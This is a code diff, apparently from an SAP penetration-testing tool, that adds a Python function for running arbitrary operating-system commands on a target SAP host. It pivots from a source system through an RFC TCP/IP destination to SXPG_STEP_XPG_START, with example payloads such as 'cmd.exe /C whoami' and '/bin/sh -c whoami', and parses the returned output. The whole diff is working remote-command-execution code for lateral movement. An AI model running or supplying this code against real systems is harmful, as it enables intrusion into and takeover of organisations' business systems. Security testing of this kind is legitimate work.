@@ -920,3 +920,75 @@ def create_tcpip_destination(node: SAPNode, target_host: str,
         logger.debug(f"TCP/IP dest creation failed: {e}")
 
     return result
+
+
+# ---------------------------------------------------------------------------
+# Remote OS command execution via SXPG_STEP_XPG_START
+# ---------------------------------------------------------------------------
+
+def execute_remote_command(node: SAPNode, destination: str,
+                           command: str, params: str,
+                           creds: Credentials = None) -> dict:
+    """Execute an OS command on a remote system via SXPG_STEP_XPG_START.
+
+    Uses an existing TCP/IP destination (sapxpg) to run a command on the
+    target system.  The source system calls SXPG_STEP_XPG_START which
+    forwards the execution request over the TCP/IP destination.
+
+    Args:
+        node: source SAP system (where we have credentials)
+        destination: TCP/IP destination name (e.g. SAPMAP_W74_20260305165740)
+        command: executable to run (e.g. cmd.exe or /bin/sh)
+        params: command parameters (e.g. /C whoami or -c whoami)
+        creds: credentials on the source system
+
+    Returns dict with: success, output (list of lines), error
+    """
+    result = {"success": False, "output": [], "error": ""}
+
+    try:
+        with _get_connection(node, creds) as conn:
+            call_result = conn.call(
+                "SXPG_STEP_XPG_START",
+                TARGET="",
+                DESTINATION=destination,
+                EXTPROG=command,
+                PARAMS=params,
+                STDINCNTL="R",
+                STDOUTCNTL="M",
+                STDERRCNTL="M",
+                TRACECNTL="0",
+                TERMCNTL="C",
+                TRACELEVEL="0",
+                LONG_PARAMS="",
+                CONNCNTL="H",
+            )
+
+            # Parse LOG table for output lines
+            log_table = call_result.get("LOG", [])
+            for row in log_table:
+                line = ""
+                if isinstance(row, dict):
+                    line = (row.get("MESSAGE", "") or
+                            row.get("LINE", "") or
+                            row.get("TEXT", "")).strip()
+                elif isinstance(row, str):
+                    line = row.strip()
+                if line:
+                    result["output"].append(line)
+
+            # Check return status
+            ret_status = call_result.get("STATUS", "")
+            if str(ret_status).strip() in ("O", "0", ""):
+                result["success"] = True
+            elif result["output"]:
+                # Some systems return output even on non-zero status
+                result["success"] = True
+            else:
+                result["error"] = f"SXPG status: {ret_status}"
+
+    except Exception as e:
+        result["error"] = str(e)
+        logger.debug(f"SXPG remote command failed via {destination}: {e}")
+
+    return result
